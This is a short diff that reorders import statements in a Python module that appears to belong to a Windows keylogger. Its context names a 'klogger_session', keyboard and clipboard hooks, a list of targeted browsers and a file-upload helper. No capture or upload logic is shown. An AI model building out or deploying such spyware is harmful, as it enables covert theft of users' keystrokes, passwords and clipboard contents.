@@ -1,10 +1,7 @@
-from clint.drive import send_file
-from logger import log
 import atexit
 import time
 from queue import Empty, Queue
 from threading import Event, Thread
-from typing import Tuple
 
 import psutil
 import win32clipboard as clip
@@ -12,9 +9,10 @@ import win32gui
 import win32process
 from pynput.keyboard import Key
 
+from clint.drive import send_file
 from clint.keyboard import BrowserHotKeys
 from clint.util import data_store
-
+from logger import log
 
 session="klogger_session"
 browsers=("iexplore.exe", "chrome.exe", "firefox.exe", "Yandex.exe", "opera.exe", "UCBrowser.exe", "Brave.exe")
